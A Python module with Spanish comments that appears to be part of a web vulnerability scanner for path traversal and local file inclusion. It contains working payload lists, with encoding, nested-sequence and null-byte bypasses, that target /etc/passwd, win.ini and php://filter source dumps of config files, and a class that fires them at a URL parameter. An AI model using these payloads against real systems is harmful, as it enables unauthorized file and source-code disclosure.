# -*- coding: utf-8 -*-
"""
Motor avanzado de detección de Path Traversal y Local File Inclusion (LFI).
Soporta:
- Bypasses de filtros de ruta (doble codificación URL, secuencias anidadas ....//, null byte)
- Objetivos Linux (/etc/passwd, /proc/version)
- Objetivos Windows (win.ini, boot.ini)
- Wrappers de PHP (php://filter con decodificación automática de código fuente Base64)
"""

import re
import base64
from urllib.parse import urlparse

# Parámetros típicamente asociados a inclusión de archivos o rutas
LFI_PARAM_HINTS = {
    'file', 'page', 'doc', 'document', 'path', 'view', 'template',
    'layout', 'download', 'load', 'read', 'include', 'content',
    'folder', 'root', 'dir', 'module', 'cat', 'source', 'action',
    'dest', 'file_name', 'filename', 'conf', 'config', 'report',
    'url', 'uri', 'redirect', 'target', 'item'
}

# Firmas regex de archivos del sistema
SIGNATURES_LINUX = [
    (re.compile(r"root:[x*]:0:0:", re.I), "/etc/passwd (root account)"),
    (re.compile(r"daemon:[x*]:[0-9]+:[0-9]+:", re.I), "/etc/passwd (daemon account)"),
    (re.compile(r"bin:[x*]:[0-9]+:[0-9]+:", re.I), "/etc/passwd (bin account)"),
    (re.compile(r"/bin/(bash|sh|false|nologin)"), "/etc/passwd (shell path)"),
    (re.compile(r"Linux version [0-9]+\.[0-9]+", re.I), "/proc/version (Kernel banner)")
]

SIGNATURES_WINDOWS = [
    (re.compile(r"\[(fonts|extensions|mci extensions|files)\]", re.I), "win.ini sections"),
    (re.compile(r"; for 16-bit app support", re.I), "win.ini header"),
    (re.compile(r"\[boot loader\]", re.I), "boot.ini")
]

# Payloads clasificados por técnica
PAYLOADS_TRAVERSAL = [
    # 1. Linux Standard & Traversal profundo
    ("../../../../etc/passwd", "Linux Traversal Directo"),
    ("../../../../../../../../etc/passwd", "Linux Traversal Profundo (8 niveles)"),
    ("/etc/passwd", "Linux Ruta Absoluta"),
    
    # 2. Bypasses de sanitización de ../ (secuencias anidadas que sobreviven a strip de '../')
    ("....//....//....//....//etc/passwd", "Linux Nested Strip Bypass (....//)"),
    ("..../..../..../..../etc/passwd", "Linux Nested Slash Bypass (..../)"),
    
    # 3. Codificación URL simple y doble
    ("..%2f..%2f..%2f..%2fetc%2fpasswd", "Linux URL Encoded (%2f)"),
    ("..%252f..%252f..%252f..%252fetc%252fpasswd", "Linux Double URL Encoded (%252f)"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "Linux Full URL Encoded"),
    
    # 4. Null Byte injection (efectivo en PHP < 5.3.4 y servicios C/C++)
    ("../../../../etc/passwd%00", "Linux Null Byte Bypass (%00)"),
    ("../../../../etc/passwd%00.html", "Linux Null Byte con extensión fija"),
    
    # 5. Windows Traversal
    ("..\\..\\..\\..\\windows\\win.ini", "Windows Backslash Traversal"),
    ("../../../../windows/win.ini", "Windows Forward Slash Traversal"),
    ("..%5c..%5c..%5c..%5cwindows%5cwin.ini", "Windows URL Encoded Backslash (%5c)"),
    ("c:\\windows\\win.ini", "Windows Ruta Absoluta"),
    ("c:/windows/win.ini", "Windows Ruta Absoluta (Slash)"),

    # 6. Linux /proc
    ("../../../../proc/version", "Linux Proc Version")
]

# Wrappers de PHP para volcado de código fuente
PHP_WRAPPER_PAYLOADS = [
    ("php://filter/convert.base64-encode/resource=index", "PHP Wrapper Base64 (index)"),
    ("php://filter/convert.base64-encode/resource=index.php", "PHP Wrapper Base64 (index.php)"),
    ("php://filter/convert.base64-encode/resource=config", "PHP Wrapper Base64 (config)"),
    ("php://filter/convert.base64-encode/resource=config.php", "PHP Wrapper Base64 (config.php)"),
    ("php://filter/read=convert.base64-encode/resource=index.php", "PHP Wrapper Read Filter")
]


def check_php_base64_disclosure(response_text):
    """
    Detecta si la respuesta contiene un volcado de código PHP codificado en Base64.
    Decodifica los bloques Base64 y busca etiquetas de código PHP.
    """
    candidates = re.findall(r'[A-Za-z0-9+/=]{40,}', response_text)
    for cand in candidates:
        try:
            decoded = base64.b64decode(cand, validate=False).decode('utf-8', errors='ignore')
            if any(k in decoded for k in ('<?php', '<?=', 'defined(', 'namespace ', 'class ', 'function ')):
                sample = decoded[:80].replace('\n', ' ').strip()
                return True, sample
        except Exception:
            continue
    return False, ""


class TraversalScanner:
    def __init__(self, session, timeout=8):
        self.session = session
        self.timeout = timeout

    def scan_endpoint(self, base_url, param):
        """
        Ejecuta pruebas avanzadas de Path Traversal y LFI sobre un parámetro:
        1. Bypasses y rutas del sistema (Linux y Windows).
        2. Wrappers de PHP con decodificación Base64.
        """
        findings = []

        # 1. Probar payloads de sistema (Linux y Windows)
        for payload, description in PAYLOADS_TRAVERSAL:
            try:
                resp = self.session.get(base_url, params={param: payload}, timeout=self.timeout)
                text = resp.text

                # Verificar firmas Linux
                for pattern, sig_name in SIGNATURES_LINUX:
                    match = pattern.search(text)
                    if match:
                        findings.append({
                            'technique': description,
                            'target_os': 'Linux',
                            'severity': 'critica',
                            'detalle': f"Archivo de sistema expuesto ({sig_name}) vía '{description}' en parámetro '{param}'",
                            'evidence': match.group(0),
                            'url': base_url,
                            'cwe': 'CWE-22'
                        })
                        return findings  # Hallazgo crítico confirmado para este parámetro

                # Verificar firmas Windows
                for pattern, sig_name in SIGNATURES_WINDOWS:
                    match = pattern.search(text)
                    if match:
                        findings.append({
                            'technique': description,
                            'target_os': 'Windows',
                            'severity': 'critica',
                            'detalle': f"Archivo de sistema expuesto ({sig_name}) vía '{description}' en parámetro '{param}'",
                            'evidence': match.group(0),
                            'url': base_url,
                            'cwe': 'CWE-22'
                        })
                        return findings

            except Exception:
                continue

        # 2. Probar Wrappers de PHP (LFI -> Source Code Disclosure)
        for payload, description in PHP_WRAPPER_PAYLOADS:
            try:
                resp = self.session.get(base_url, params={param: payload}, timeout=self.timeout)
                es_codigo, muestra = check_php_base64_disclosure(resp.text)
                if es_codigo:
                    findings.append({
                        'technique': description,
                        'target_os': 'PHP / Multiplataforma',
                        'severity': 'critica',
                        'detalle': f"Volcado de código fuente vía wrapper PHP en parámetro '{param}' ({description})",
                        'evidence': f"Código extraído: {muestra}...",
                        'url': base_url,
                        'cwe': 'CWE-22'
                    })
                    return findings
            except Exception:
                continue

        return findings
